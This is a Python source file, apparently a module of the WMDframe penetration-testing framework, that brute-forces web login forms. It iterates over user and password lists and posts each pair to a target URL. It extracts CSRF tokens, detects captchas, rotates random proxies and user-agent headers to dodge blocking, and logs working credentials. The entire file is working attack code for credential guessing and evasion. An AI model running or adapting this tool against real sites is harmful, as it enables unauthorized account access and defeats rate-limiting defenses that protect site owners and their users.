#!/usr/bin/env python3
#
# MIT - (c) 2016 ThomasTJ (TTJ)
# Module for WMDframe
# Todo: Make threading availeble


import os
import re
import requests
from bs4 import BeautifulSoup
from core.colors import bc as bc
import core.modules as cmodules
import core.commands as comm


# START Log files, global variables, etc.


# END Log files, global variables, etc.


# OPTIONS
class options():
    Author = 'Thomas TJ (TTJ)'
    Name = 'Bruteforce weblogin form'
    Call = 'bfweb'
    Modulename = 'bfweblogin'
    Category = 'bruteforce'
    Type = 'web'
    Version = '0.1'
    License = 'MIT'
    Description = 'Bruteforce a weblogin form with word- and passlist'
    Datecreation = '18/12/2017'
    Lastmodified = '18/12/2017'

    def __init__(self, userlist, passlist, URL, connType, urluser, urlpass, reqTimeout, wrongLogin, tokenSelect, tokenValue, tokenData, urltoken, capType, capSelect, capValue, logfile, proxyActive, proxyFile):
        self.userlist = userlist
        self.passlist = passlist
        self.URL = URL
        self.connType = connType
        self.urluser = urluser
        self.urlpass = urlpass
        self.reqTimeout = reqTimeout
        self.wrongLogin = wrongLogin
        self.tokenSelect = tokenSelect
        self.tokenValue = tokenValue
        self.tokenData = tokenData
        self.urltoken = urltoken
        self.capType = capType
        self.capSelect = capSelect
        self.capValue = capValue
        self.logfile = logfile
        self.proxyActive = proxyActive
        self.proxyFile = proxyFile
        self.show_all()

    # Possible options
    def poss_opt(self):
        return ('userlist', 'passlist', 'URL', 'conntype', 'urluser', 'urlpass', 'reqTimeout', 'wrongLogin', 'tokenSelect', 'tokenValue', 'tokenData', 'urltoken', 'capType', 'capValue', 'capSelect', 'logfile', 'proxyActive', 'proxyFile')

    # Show options
    def show_opt(self):
        print(
            ""
            + "\n\t" + bc.OKBLUE + ("%-*s %-*s %-*s %s" % (15, "OPTION", 8, "RQ", 25, "VALUE", "DESCRIPTION")) + bc.ENDC
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "------", 8, "--", 25, "-----", "-----------"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "userlist:", 8, "y", 25, self.userlist, "Path to userlist"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "passlist:", 8, "y", 25, self.passlist, "Path to passwordlist"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "URL:", 8, "y", 25, self.URL, 'Login URL'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "connType:", 8, "y", 25, self.connType, 'HTTP or HTTPS'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "urluser:", 8, "y", 25, self.urluser, 'Whats the identifier for the username in the POST url, e.g. "username"'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "urlpass:", 8, "y", 25, self.urlpass, 'Whats the identifier for the password in the POST url, e.g. "password"'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "reqTimeout:", 8, "y", 25, self.reqTimeout, 'Timeout for requests (using proxies can increase this!)'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "wrongLogin:", 8, "y", 25, self.wrongLogin, 'Some of the whole error message when using wrong user or pass, e.g. "Bad username"'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "tokenSelect:", 8, "n", 25, self.tokenSelect, 'E.g. CSRF - The HTML selector holding the identifier, e.g. "name"'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "tokenValue:", 8, "n", 25, self.tokenValue, 'E.g. CSRF - The identifier, e.g. "csrf_token"'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "tokenData:", 8, "n", 25, self.tokenData, 'E.g. CSRF - The selector holding the value, e.g. "value"'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "urltoken:", 8, "n", 25, self.urltoken, 'Whats the identifier for the token in the POST url, e.g. "csrf_token"'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "capType:", 8, "n", 25, self.capType, 'Captcha - HTML type, e.g. "input"'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "capSelect:", 8, "n", 25, self.capSelect, 'Captcha - The HTML selector holding the identifier, e.g. "name"'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "capValue:", 8, "n", 25, self.capValue, 'Captcha - The identifier, e.g. "captcha"'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "logfile:", 8, "n", 25, self.logfile, 'Save positive results to logfile'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "proxyActive:", 8, "n", 25, self.proxyActive, 'Activate proxy (y/n)'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "proxyFile:", 8, "n", 25, self.proxyFile, 'Proxylist'))
            + "\n"
            )

    # Show commands
    def show_commands(self):
        print(
            ""
            + "\n\t" + bc.OKBLUE + "COMMANDS:" + bc.ENDC
            + "\n\t" + "---------"
            + "\n\t" + ("%-*s ->\t%s" % (9, "run", "Run the script"))
            # + "\n\t" + ("%-*s ->\t%s" % (9, "custom", "Custom extra function"))
            # + "\n\t" + ("%-*s ->\t%s" % (9, "runcom", "Run program with specific arguments <runcom [args]>"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "info", "Information"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "help", "Help"))
            # + "\n\t" + ("%-*s ->\t%s" % (9, "pd", "Predefined arguments for 'runcom'"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "so", "Show options"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "sa", "Show module info"))
            + '\n\t' + ('%-*s ->\t%s' % (9, 'invoke', 'Invoke module'))
            + "\n\t" + ("%-*s ->\t%s" % (9, "exit", "Exit"))
            + "\n"
            )

    # Show all info
    def show_all(self):
        cmodules.showModuleData(
            options.Author,
            options.Name,
            options.Call,
            options.Category,
            options.Type,
            options.Version,
            options.Description,
            options.License,
            options.Datecreation,
            options.Lastmodified
            )
        self.show_commands()
        self.show_opt()
# END OPTIONS


def token(dataSoup):
    csrf = dataSoup.find(attrs={sop.tokenSelect: sop.tokenValue})
    csrf = csrf[sop.tokenData]
    # csrf = dataSoup.find(attrs={"name": "csrf_token"})
    # csrf = csrf['value']
    return csrf


def checkCaptcha(dataSoup):
    imgCap = dataSoup.findAll(sop.capType, {sop.capSelect: sop.capValue})
    # imgCap = dataSoup.findAll("input", {"name": "captcha"})
    if imgCap:
        return 'CapDetect'
    else:
        return None


def saveLogCheck():
    if sop.logfile:
        if not os.path.isfile(sop.logfile):
            os.mknod(sop.logfile)
        else:
            appendtofile = input("\t->  " + bc.WARN + "wmd" + bc.ENDC + "@" + bc.WARN + "logfile exists - append (Y/n):" + bc.ENDC + " ")
            if appendtofile.lower() not in ('y', 'n'):
                appendtofile = 'y'
            if appendtofile == 'n':
                print('\t[!] Exiting\n')
                return 'Exit'


def saveLog(data):
    if sop.logfile:
        with open(sop.logfile, 'a') as file:
            file.write(data + "\n")


def tryLogin(username, password):
    tokenData = ''
    imgCap = ''

    if sop.proxyActive.lower() == 'y':
        proxy = comm.getRandomProxy(sop.connType)
    s = requests.Session()
    print('\t[+] Session OK')

    headers = comm.getUserAgentHeader()

    if sop.capType or sop.tokenValue:
        while True:
            try:
                if sop.proxyActive.lower() == 'y':
                    soup = BeautifulSoup(s.get(sop.URL, proxies=proxy, timeout=sop.reqTimeout).text, 'html.parser')
                else:
                    soup = BeautifulSoup(s.get(sop.URL, timeout=sop.reqTimeout).text, 'html.parser')
                if sop.tokenValue:
                    print('\t[*] Checking token')
                    tokenData = token(soup)
                if sop.capValue:
                    print('\t[*] Checking captcha')
                    imgCap = checkCaptcha(soup)
                break
            except (KeyboardInterrupt, SystemExit):
                return 'Break'
            except:
                if sop.proxyActive.lower() == 'y':
                    proxy = comm.getRandomProxy(sop.connType)
                else:
                    print('\t[!] ERROR in connection.')

        if sop.tokenValue and not tokenData:
            print(bc.WARN + '\t[!]' + bc.ENDC + ' No token found?!')
            return 'NoToken'

        if sop.capValue and imgCap:
            return 'CapDetect'

        print('\t[+] Token: ' + str(tokenData))

    # Do the limbo and cross your fingers
    print('\t[+] POST query ready')
    while True:
        try:
            if sop.proxyActive.lower() == 'y':
                soupL = BeautifulSoup(s.post(sop.URL, headers=headers, proxies=proxy, timeout=sop.reqTimeout, data={sop.urltoken: tokenData, sop.urluser: username, sop.urlpass: password}).text, 'html.parser')
            else:
                soupL = BeautifulSoup(s.post(sop.URL, headers=headers, timeout=sop.reqTimeout, data={sop.urltoken: tokenData, sop.urluser: username, sop.urlpass: password}).text, 'html.parser')
            break
        except (KeyboardInterrupt, SystemExit):
            return 'Break'
        except:
            if sop.proxyActive.lower() == 'y':
                proxy = comm.getRandomProxy(sop.connType)
            else:
                print('\t[!] ERROR in connection.')

    # Getting a captcha on your POST - Hmm, then something terrible has happend
    if sop.capValue:
        capDetect = checkCaptcha(soupL)
        if capDetect == 'CapDetect':
            return 'CapDetectPost'

    loginOK = soupL.findAll(text=re.compile(sop.wrongLogin))  # Bad username|Forgot password

    if loginOK:
        print(bc.FAIL + '\t[-]' + bc.ENDC + '  Checking - U: ' + str(username) + ' P: ' + str(password) + ' ' + str(loginOK))
        # s.close()
    else:
        positiveResult = (bc.OKGREEN + '\t[+]' + bc.ENDC + '  Working: ' + username + ' and pwd: ' + password)
        saveLog(positiveResult)
        print(positiveResult)
        # s.close()

    loginOK = ''
    return 'next'


def run():
    saveLogCheck()
    # Open user- and passlist and loop through them
    with open(sop.userlist, 'r') as fuser, open(sop.passlist, 'r') as fpass:
        for uline in fuser:
            for pline in fpass:
                bf = tryLogin(uline.strip('\n'), pline.strip('\n'))
                # Check the return:
                if bf == 'CapDetect':
                    print(bc.WARN + '\t[-]' + bc.ENDC + '  Checking - U: ' + str(uline.strip('\n')) + ' P: ' + str(pline.strip('\n')) + '  --> ' + 'Caught a captcha.. trying again')
                elif bf == 'CapDetectPost':
                    print(bc.WARN + '\t[-]' + bc.ENDC + '  Checking - U: ' + str(uline.strip('\n')) + ' P: ' + str(pline.strip('\n')) + '  --> ' + 'Caught a captcha on a POST.. trying again')
                elif bf == 'NoToken':
                    print(bc.WARN + '\t[-]' + bc.ENDC + 'Checking - U: ' + str(uline.strip('\n')) + ' P: ' + str(pline.strip('\n')) + '  --> ' + 'No token found.. trying again')
                elif bf == 'Break':
                    exitBF = input("\t->  " + bc.WARN + "wmd" + bc.ENDC + "@" + bc.WARN + "exit bruteforce (Y/n):" + bc.ENDC + " ")
                    if exitBF.lower() not in ('y', 'n'):
                        exitBF = 'y'
                    if exitBF == 'y':
                        return '\tExiting\n'
                else:
                    return 'Error'


def info():
    pass


def helpMe():
    pass


# CONSOLE
def console():
    value = input("   -> " + bc.FAIL + "wmd" + bc.ENDC + "@" + bc.FAIL + "bfweblogin:" + bc.ENDC + " ")
    userinput = value.split()
    if 'so' in userinput[:1]:
        sop.show_opt()
    elif 'sa' in userinput[:1]:
        sop.show_all()
    elif 'help' in userinput[:1]:
        helpMe()
    elif 'info' in userinput[:1]:
        info()
    elif 'run' in userinput[:1]:
        run()
    elif 'set' in userinput[:1]:
        useroption = str(userinput[1:2]).strip('[]\'')
        uservalue = str(userinput[2:3]).strip('[]\'')
        if useroption not in sop.poss_opt():
            print(bc.WARN + "\n    Error, no options for: " + useroption + "\n" + bc.ENDC)
        elif useroption in sop.poss_opt():
            setattr(sop, useroption, uservalue)
            print('\n      ' + useroption + '\t> ' + uservalue + "\n")
    elif 'invoke' in userinput[:1]:
        comm.invokeModule(options.Call)
        return None
    elif 'back' in userinput[:1] or 'exit' in userinput[:1]:
        return None
    else:
        command = str(userinput[:1]).strip('[]\'')
        print(bc.WARN + "\n    Error, no options for: " + command + "\n" + bc.ENDC)
    console()
# END console


def main():
    print('\n')
    print('      ____  ______                 __    __            _       ')
    print('     / __ )/ ____/  _      _____  / /_  / /___  ____ _(_)___   ')
    print('    / __  / /_     | | /| / / _ \/ __ \/ / __ \/ __ `/ / __ \  ')
    print('   / /_/ / __/     | |/ |/ /  __/ /_/ / / /_/ / /_/ / / / / /  ')
    print('  /_____/_/        |__/|__/\___/_.___/_/\____/\__, /_/_/ /_/   ')
    print('                                             /____/            ')

    print('\n')
    # if os.getuid() != 0:
    #    print("r00tness is needed due to packet sniffing!")
    #    print("Run the script again as root/sudo")
    #    return None
    print('\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)
    comm.checkNetConnectionV()
    comm.checkNetVPNV()
    print('')
    global sop
    sop = options('files/user.txt', 'files/pwd_john.txt', 'http://url.com?', 'HTTP', 'username', 'password', 10, 'Login failed', '', '', '', '', '', '', '', '', 'y', 'files/proxies.txt')
    console()
